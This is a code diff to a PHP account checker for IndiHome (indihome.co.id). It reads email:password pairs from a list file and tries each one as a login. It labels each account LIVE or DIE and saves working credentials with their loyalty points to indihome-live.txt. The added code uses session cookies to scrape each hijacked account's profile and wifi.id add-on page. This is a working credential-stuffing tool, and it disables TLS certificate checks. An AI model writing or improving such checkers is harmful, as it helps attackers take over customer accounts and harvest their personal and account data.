@@ -95,6 +95,38 @@ function get_between($string, $start, $end)
         $len = strpos($string,$end,$ini) - $ini;
         return substr($string,$ini,$len);
 }
+function cek_profil($cookie){
+$header = array();
+$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0";
+$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
+$header[] = "Accept-Language: en-US,en";
+$header[] = 'Cookie: '.$cookie[1][0].'; '.$cookie[1][1].'; '.$cookie[1][2].';';
+	$c = curl_init("https://www.indihome.co.id/profile");
+	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
+	curl_setopt($c, CURLOPT_HEADER, TRUE);
+	$response = curl_exec($c);
+	return $response;
+}
+function cek_seamless($cookie){
+$header = array();
+$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0";
+$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
+$header[] = "Accept-Language: en-US,en";
+$header[] = 'Cookie: '.$cookie[1][0].'; '.$cookie[1][1].'; '.$cookie[1][2].';';
+	$c = curl_init("https://www.indihome.co.id/addon/wifiid-seamless");
+	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
+	curl_setopt($c, CURLOPT_HEADER, TRUE);
+	$response = curl_exec($c);
+	return $response;
+}
 $i = 0;
 $listcode = $argv[1];
 $codelistlist = file_get_contents($listcode);
@@ -111,12 +143,13 @@ preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $get_cookie, $cookie);
 preg_match('/<input type="hidden" name="_token" value="(.*?)">/', $get_cookie, $token);
 $cek = cek($token,$cookie,$em);
 if(preg_match('/https:\/\/www.indihome.co.id\/assets\/images\/dompet.png/i', $cek)){
-	
 	$point=get_between($cek, '<a href="https://www.indihome.co.id/poin">', '</a>');
 	$poin = str_replace("\n", "", $point);
 	$p = str_replace(" ", "", $poin);
-	echo $colors->getColoredString("[ $i ] LIVE | ".$email." | ".$pass."| [ Point : ".$p." ] | ACC : INDIHOME ", "white", "green"). "\n";
-	fwrite(fopen("indihome-live.txt", "a"), "LIVE | ".$email."|".$pass."| [ Point : ".$p." ] | ACC : INDIHOME  \n");
+	$berapa = cek_profil($cookie);
+	preg_match('/Profil IndiHome <b>(.*?)<\/b><br\/><br\/>/', $berapa, $persen);
+	echo $colors->getColoredString("[ $i ] LIVE | ".$email." | ".$pass."| [ Point : ".$p." ] [".$persen[1]."]| ACC : INDIHOME ", "white", "green"). "\n";
+	fwrite(fopen("indihome-live.txt", "a"), "LIVE | ".$email."|".$pass."| [ Point : ".$p." ] [".$persen[1]."]| ACC : INDIHOME  \n");
 } else{
 	echo $colors->getColoredString("[ $i ] DIE | ".$email." | ".$pass." | ACC : INDIHOME ", "black", "red"). "\n";
 }$i++;
